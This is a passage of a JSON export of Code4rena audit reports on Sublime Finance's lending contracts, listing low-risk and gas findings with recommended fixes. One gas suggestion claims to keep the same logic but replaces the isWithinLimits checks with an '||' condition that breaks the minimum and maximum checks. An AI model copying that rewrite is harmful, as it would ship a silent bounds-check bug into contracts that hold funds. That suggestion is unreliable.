Concept\n\n1. Navigate to \"https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L25\" & \"https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L10\"\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n\n# C4-004 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L283\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n\n# C4-005 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n```\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L283\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n\n# C4-006 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical change should be completed with the two step. For instance, migrate function can be implemented with the two step procedure. (accept migrating)\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L189\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n\n# C4-007 : # USE SAFEERC20.SAFEAPPROVE INSTEAD OF APPROVE\n\n## Impact - LOW\n\nNote that approve() will fail for certain token implementations that do not return a boolean value (). Hence it is recommend to use safeApprove().\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L267\"\n\n& https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L755\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nUpdate to _token.safeApprove(spender, type(uint256).max) in the function.\n\n\n# C4-008 : #  Missing zero-address checks in constructor\n\n## Impact - LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are constructed incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n\"https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L267\"\n\n& https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L755\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n\n# C4-009 : # The Contract Should Approve(0) first\n\n## Impact\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n1. Navigate to \"https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L267\"\n\n& https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L755\n```\n\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/79"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Upgrade pragma compiler at least ^0.8.* or 0.8.4  \n\nThis known issue was set before at :\n\n https://github.com/code-423n4/2021-12-sublime-findings/issues/39  \n\nusing new compiler will set Optimizer improvement for Safemath, Custom error, etc. it would be saving more gas by using it.  \n\n##Occurance\n\n PooledCreditLine.sol\nLenderPool.sol \ntwitterVerifier.sol \n\n\n2.  Better way of using `SafeERC20` to saving more gas  \n\nhttps://github.com/sublime-finance/sublimev1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L295\n\nThis implementation can be saving more gas   \n\n##POC\n\n  by not declaring :\n```\nusing SafeErc20 for IERC20 ;\n```\n  \nand change into \n\n```\nSafeERC20.safeTransferFrom(IERC20(_borrowAsset), msg.sender, address(this), _amountToLend); \n```\n\n  3.  Rewrite struct order for saving more gas\n\n  this implementation below can be used for saving more gas  \n\n##Tool Used\nManual Review \n\n##POC\n```\n    struct PooledCreditLineConstants {\n        uint128 borrowLimit;\n        uint128 borrowRate;\n        uint256 startsAt;\n        uint256 endsAt;\n        uint256 defaultsAt;\n        uint256 gracePenaltyRate;\n        uint256 idealCollateralRatio;\n        address borrower;\n        address borrowAsset;\n        address collateralAsset;\n        address borrowAssetStrategy;\n        address collateralAssetStrategy;\n    }\n```\n\n4. change if else statement for saving more gas\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L373\n\nthis implementation with the same logic, can be used for saving more gas (+- 12 gas)\n\n##Tool Used \nRemix \n\n##POC\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.7.6;\npragma abicoder v2;\n   \ncontract foo{\n\n   function isWithinLimits(\n        uint256 _value,\n        uint256 _min,\n        uint256 _max\n    ) internal pure returns (bool) {\n        if (_min != 0 && _max != 0) {\n            // If both min and max limits exist\n            return (_value >= _min && _value <= _max);\n        } else if (_min != 0) {\n            // if only min limit exists\n            return (_value >= _min);\n        } else if (_max != 0) {\n            // if only max limit exists\n            return (_value <= _max);\n        } else {\n            // if both min and max limits don't exist\n            return true;\n        }\n    }\n}\n// 67066\n```\nchange to\n\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.7.6;\npragma abicoder v2;\n   \ncontract foo{\n\n   function isWithinLimits(\n        uint256 _value,\n        uint256 _min,\n        uint256 _max\n    ) internal pure returns (bool) {\n        if (_min != 0 && _max != 0) {\n            return (_value >= _min && _value <= _max);\n        } else if ( _min != 0 || _max != 0 ) {\n            return (_value >= _min || _value <= _max);\n        } else {\n            // if both min and max limits don't exist\n            return true;\n        }\n    }\n}\n// 67054\n```\n\n5.  Variable can be set as immutable \n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L16\n\n##POC\n```\nIVerification public immutable verification;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/69"
    }
  },
  {
    "title": "QA Report",
    "body": "# 1. Low - Possible casting overflow\n\n## Impact\n\nA casting overflow can happen when a uint256 is cast to a uint128. SafeMath does not provide protection for casting overflows, and the overflow may lead to unexpected edge cases.\n\n## Proof of Concept\n\nA casting overflow could occur at this line of PooledCreditLine\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L723\n\nAn amount value this large may be reached for some ERC20 tokens with a very large total supply and a very small value per token.\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nMake borrowLimit uint256, not uint128 in the PooledCreditLineConstants struct. The only reason why borrowLimit and borrowRate in the PooledCreditLineConstants struct are uint128 is for gas savings, but it would be safer to use uint256 for these variables. The gas savings might be minor because the casting operation is required.\n\nAnother solution is to use Open Zeppelin SafeCast\n\n# 2. Low - transfer return value is ignored\n\n## Impact\n\nSome ERC20 tokens, such as USDT, don't revert when transfer/transferFrom fails. The transfer return value has to be checked (as there are some other tokens that returns false instead revert). safeTransfer should be used instead of transfer\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nUse safeTransfer instead of transfer. This line `using SafeERC20 for IERC20;` means the safeTransfer function is available\n\n# 3. Low - Collateral can be added when expired\n\n## Impact\n\nThe PoolCreditLine contract allows collateral deposits when the PooledCreditLineStatus is expired. There should not be any need to add collateral when the status is expired, so this logic branch should be removed to reduce possible edge case scenarios.\n\n## Proof of Concept\n\nThe suspect line of code is\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L745\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nRemove the code `|| _status == PooledCreditLineStatus.EXPIRED` from the if statement of line 745 of PoolCreditLine",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/68"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L] `LenderPool.sol#lend()` Wrong event emitted\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L281-L304\n```solidity\n    function lend(uint256 _id, uint256 _amount) external nonReentrant {\n        require(VERIFICATION.isUser(msg.sender, pooledCLConstants[_id].lenderVerifier), 'L1');\n        require(block.timestamp < pooledCLConstants[_id].startTime, 'L2');\n\n        uint256 _totalLent = totalSupply[_id];\n        uint256 _maxLent = pooledCLConstants[_id].borrowLimit;\n        require(_maxLent > _totalLent, 'L3');\n\n        uint256 _amountToLend = _amount;\n        if (_totalLent.add(_amount) > _maxLent) {\n            _amountToLend = _maxLent.sub(_totalLent);\n        }\n        address _borrowAsset = pooledCLConstants[_id].borrowAsset;\n\n        IERC20(_borrowAsset).safeTransferFrom(msg.sender, address(this), _amountToLend);\n        _mint(msg.sender, _id, _amountToLend, '');\n\n        emit Lend(_id, msg.sender, _amount);\n\n        // If borrowLimit reached, accept CL\n        if (_totalLent.add(_amountToLend) == _maxLent) {\n            _accept(_id, _maxLent);\n        }\n    }\n```\n\n`_amount` should be changed to : `_amountToLend`.\n\n## [L] Wrong value for `LimitsUpdated` event parameter\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L233\n\n```solidity\n    event LimitsUpdated(string indexed limitType, uint256 max, uint256 min);\n```\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L404-L409\n\n```solidity\n    function updateBorrowLimitLimits(uint256 _min, uint256 _max) external onlyOwner {\n        require(_min < _max || _min.mul(_max) == 0, 'UBLL1');\n        require(!(borrowLimitLimits.min == _min && borrowLimitLimits.max == _max), 'UBLL2');\n        borrowLimitLimits = Limits(_min, _max);\n        emit LimitsUpdated('borrowLimit', _min, _max);\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity\n        emit LimitsUpdated('borrowLimit', _max, _min);\n```\n\n## [N] Outdated compiler version\n\nIt's a best practice to use the latest compiler version.\n\nThe specified minimum compiler version is quite old. Older compilers might be susceptible to some bugs. We recommend changing the solidity version pragma to the latest version to enforce the use of an up to date compiler.\n\nList of known compiler bugs and their severity can be found here: https://etherscan.io/solcbuginfo\n\n## [N] `PooledCreditLine.sol` `LenderPool.sol` should use the Upgradeable variant of OpenZeppelin Contracts\n\nAs per the OpenZeppelin docs:\n\n> If your contract is going to be deployed with upgradeability, such as using the OpenZeppelin Upgrades Plugins, you will need to use the Upgradeable variant of OpenZeppelin Contracts.\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L7-L7\n\n```solidity\nimport '@openzeppelin/contracts/utils/ReentrancyGuard.sol';\n```\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L7-L7\n\n```solidity\nimport '@openzeppelin/contracts/utils/ReentrancyGuard.sol';\n```\n\n\n### Recommendation\n\nChange to:\n\n```solidity\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n```\n\n## [L] Precision loss due to `div` before `mul`\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L944\n\n```solidity\n_maxPossible = _totalCollateralToken.mul(_ratioOfPrices).div(_collateralRatio).mul(SCALING_FACTOR).div(10**_decimals);\n```\n\nCan be changed to:\n\n```solidity\n_maxPossible = _totalCollateralToken.mul(_ratioOfPrices).mul(SCALING_FACTOR).div(_collateralRatio).div(10**_decimals);\n```\n\n## [N] Fee on transfer tokens are not supported",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/61"
    }
  },
  {
    "title": "QA Report",
    "body": "## M-01:\nconsistently use safeTransfer instead of transfer\n\nLenderPool.start(uint256,address) (PooledCreditLine/LenderPool.sol#312-330) ignores return value by IERC20(_borrowAsset).transfer(_to,_fee) (PooledCreditLine/LenderPool.sol#327)\n\nConsider to use safeTransfer\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/51"
    }
  },
  {
    "title": "QA Report",
    "body": "# Summary\nWe list 6 low-critical findings and 6 non-critical findings here:\n* (Low) LenderPool.withdrawInterest allows withdrawing interest for arbitrary lender\n* (Low) LenderPool.calculatePrincipalWithdrawable does not take into consideration status == CANCELLED\n* (Low) `PooledCreditLine.request` priceOracle fallback to uniswap, and anyone can register uniswap for arbitrary tokens, it is possible to use malicious tokens\n* (Low) Use safeTransfer to check return value\n* (Low) Uninitialized variable in repay function of PooledCreditLine.sol\n* (Low) Everyone can call LenderPool.start\n* (Non) PooledCreditLine.repay can be called by anyone\n* (Non) Approve amount always `type(uint256).max`\n* (Non) Lender.Pool._beforeTokenTransfer consider using continue instead\n* (Non) Uses non upgradeable version of reentrancy guard contract\n* (Non) Variable assigns twice\n* (Non) LenderPool and PooledCreditLine is not upgrade safe\n\nIn summary of recommended security practices, it's better to restrict function access, use 3rd party libraries for security (e.g. safeTransfer, ReentrancyGuardUpgradeable), and take consideration of status.\n\n# (Low) LenderPool.withdrawInterest allows withdrawing interest for arbitrary lender\n\n## Impact\n\n`LenderPool.withdrawInterest` allows lenders to retrieve the interest that is owed to them. However it doesn’t check the weather msg.sender is lender. Which means an attacker can call `LenderPool.withdrawInterest` in order to make others retrieve their interest. It could be harmless, the attacker can get any interest. But the lenders may not want to retrieve their interest at that moment.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L425\n\n\n## Recommended Mitigation Steps\n\nUse msg.sender as lender.\n\n\n# (Low) LenderPool.calculatePrincipalWithdrawable does not take into consideration status == CANCELLED\n\n## Impact\n\nIf `_status == PooledCreditLineStatus.CANCELLED`, `LenderPool.calculatePrincipalWithdrawable` returns 0. But it is not the correct number.\n\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L579\n\n## Recommended Mitigation Steps\n\nTake `PooledCreditLineStatus.CANCELLED` into consideration.\n\nAdd `_status == PooledCreditLineStatus.CANCELLED` into the statement of if condition. \n\n\n# (Low) `PooledCreditLine.request` priceOracle fallback to uniswap, and anyone can register uniswap for arbitrary tokens, it is possible to use malicious tokens\n\n## Impact\n\nCheck on borrow/collateral asset relies on `IPriceOracle(priceOracle).doesFeedExist(_request.borrowAsset, _request.collateralAsset)`. However, since priceOracle falls back to uniswap, and anyone can register uniswap for arbitrary tokens, it is possible to use malicious tokens.\nWhile lenders should probably be sensible enough to avoid those kinds of pools, it is hard to judge the difficulty of telling between benign uniswap pair and potentially malicious uniswap pair (most users probably just check name).\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L641\n\n## Recommended Mitigation Steps\n\nUse whitelist to prevent malicious uniswap pair.\n\n# (Low) Use safeTransfer to check return value\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327\n\n## Impact\n\nIf ERC20 transfer fails, it will return false rather than revert, and lose `_fee` of `_to` address.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327\n\n## Recommended Mitigation Steps\n\nUse `safeTransfer` to check the return value:\n\n```\n        IERC20(_borrowAsset).safeTransfer(_to, _fee);\n```\n\n# (Low) Uninitialized variable in repay function of PooledCreditLine.sol\n\n## Impact\n\nThe variable `uint256 _principalPaid` is uninitialized. In the case here, solc-bin implicitly sets uninitialized stack value to 0, but this feature is undocumented and not guaranteed in solc, thus it would be best to do an explicit initialization here.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L994\n\nIf `_amount <= _interestToPay`, `_principalPaid` will be uninitialized.\n\n## Recommended Mitigation Steps\n\nInitialize `_principalPaid` to 0:\n\n```\n        uint256 _principalPaid = 0;\n```\n\n# (Low) Everyone can call LenderPool.start\n\n## Impact\n\n`start` function in LenderPool does not check `_to`, so anyone can call this function and claim the `_fee`.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L312\n\n## Recommended Mitigation Steps\n\nIt’s better to limit the caller who is involved in.\n\n# (Non) PooledCreditLine.repay can be called by anyone\n\n## Impact\n\n`PooledCreditLine.repay` can be called by any user. It doesn’t check whether msg.sender is who should repay. However it won’t cause any problem. Also it might be intended.\n\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L976\n\n\n## Recommended Mitigation Steps\n\nCheck the relationship between msg.sender and PooledCreditLine.\n\n# (Non) Approve amount always `type(uint256).max`\n\n## Impact\n\nIn `create` function of LenderPool, it always approves `type(uint256).max` amount.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L267\n\n## Recommended Mitigation Steps\n\nIt’s better to use a limited amount rather than `type(uint256).max`.\n\n# (Non) Lender.Pool._beforeTokenTransfer consider using continue instead\n\n## Impact\n\n`_beforeTokenTransfer` has an `ids` array, it’s better to use `continue` in the for loop rather than return.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L687\n\n## Recommended Mitigation Steps\n\n```\n            if (from == address(0)) {\n                continue;\n            }\n```\n\n# (Non) Uses non upgradeable version of reentrancy guard contract\n\n## Impact\n\nUse a non upgradeable version of reentrancy guard will not initialize when using an upgradable contract. Also it will not reserve empty space to allow future versions.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L25\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L25\n\n## Recommended Mitigation Steps\n\nUse ReentrancyGuardUpgradeable:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/security/ReentrancyGuardUpgradeable.sol\n\n# (Non) Variable assigns twice\n\n## Impact\n\nThe variable `_clc.collateralAssetStrategy` is assigned twice in `_createRequest` function of PooledCreditLine.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L682\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L689\n\n## Recommended Mitigation Steps\n\nJust assign once.\n\n# (Non) LenderPool and PooledCreditLine is not upgrade safe\n\n## Impact\n\nUsing `constructor` in upgradable contract is not upgrade safe. It will cause an error when deploying an upgradable contract by hardhat: `Error: Contract XXXXX is not upgrade safe`.\n\n## Proof of Concept\n\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L592-L595\nhttps://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L205-L213\n\n## Recommended Mitigation Steps\n\nIt’s better to put immutable variables into initialize function.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-sublime-findings",
      "repo": "https://github.com/code-423n4/2022-03-sublime-findings",
      "url": "https://github.com/code-423n4/2022-03-sublime-findings/issues/46"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### Return code of `transfer()` not checked\nThe ERC20 standard says that `transfer()` and `transferFrom()` return `boolean` values to indicate whether the operation succeeded or not. While most implementations choose to `revert()` if the return value will be `false`, some do not.\n1. File: contracts/PooledCreditLine/LenderPool.sol (line [327](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327))\n```solidity\n        IERC20(_borrowAsset).transfer(_to, _fee);\n```\n\n### Return code of `approve()` not checked\n1. File: contracts/PooledCreditLine/LenderPool.sol (line [267](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L267))\n```solidity\n            SAVINGS_ACCOUNT.approve(_borrowAsset, address(POOLED_CREDIT_LINE), type(uint256).max);\n```\n2. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [755](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L755))\n```solidity\n            IERC20(_collateralAsset).approve(_strategy, _amount);\n```\n3. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1025](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1025))\n```solidity\n        IERC20(_borrowAsset).approve(_strategy, _amount);\n```\n\n### Contracts implementing an interface should inherit from that interface\n1. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [25](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L25))\n```solidity\ncontract PooledCreditLine is ReentrancyGuard, OwnableUpgradeable, IPooledCreditLine {\n```\n`PooledCreditLine` implements the functions of `ICreditLine`, but does not inherit from it. Note that `IPooledCreditLine` does NOT inherit from `ICreditLine`.\n\n### Comments should make it clear that amounts lent over limit get truncated rather than having the function revert\n1. File: contracts/PooledCreditLine/LenderPool.sol (line2 [290-292](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L290-L292))\n```solidity\n        if (_totalLent.add(_amount) > _maxLent) {\n            _amountToLend = _maxLent.sub(_totalLent);\n        }\n```\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n1. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [593](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L593))\n```solidity\n        lenderPool = _lenderPool;\n```\n2. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [594](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L594))\n```solidity\n        USDC = _usdc;\n```\n\n### Loss of precision due to multiplication on the result of a division\nAll multiplications should be done first, followed by divisions\n1. File: contracts/PooledCreditLine/LenderPool.sol (lines [823-827](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L823-L827))\n```solidity\n        uint256 _collateralNeeded = _currentDebt\n            .mul(pooledCreditLineConstants[_id].idealCollateralRatio)\n            .div(_ratioOfPrices)\n            .mul(10**_decimals)\n            .div(SCALING_FACTOR);\n```\n2. File: contracts/PooledCreditLine/LenderPool.sol (line [944](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L944))\n```solidity\n            _maxPossible = _totalCollateralToken.mul(_ratioOfPrices).div(_collateralRatio).mul(SCALING_FACTOR).div(10**_decimals);\n```\n3. File: contracts/PooledCreditLine/LenderPool.sol (lines [1246-1248](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1246-L1248))\n```solidity\n            _currentCollateralRatio = calculateTotalCollateralTokens(_id).mul(_ratioOfPrices).div(_currentDebt).mul(SCALING_FACTOR).div(\n                10**_decimals\n            );\n```\n\n### Comment does not match behavior\n1. File: contracts/Verification/twitterVerifier.sol (line [105](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L105))\n```solidity\n     * @dev only owner can register users\n```\n\n### Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\n\n1. File: contracts/Verification/twitterVerifier.sol (line [10](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/Verification/twitterVerifier.sol#L10))\n```solidity\ncontract TwitterVerifier is Initializable, IVerifier, OwnableUpgradeable, EIP712Upgradeable {\n```\n2. File: contracts/PooledCreditLine/LenderPool.sol (line [25](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L25))\n```solidity\ncontract LenderPool is ERC1155Upgradeable, ReentrancyGuard, OwnableUpgradeable, IPooledCreditLineEnums, ILenderPool {\n```\n3. File: contracts/PooledCreditLine/PooledCreditLine.sol (line [25](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L25))\n```solidity\ncontract PooledCreditLine is ReentrancyGuard, OwnableUpgradeable, IPooledCreditLine {\n```\n\n## Non-critical Issues\n\n\n### `safeApprove()` is deprecated\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\n\n1. File: contracts/PooledCreditLine/LenderPool.sol (line 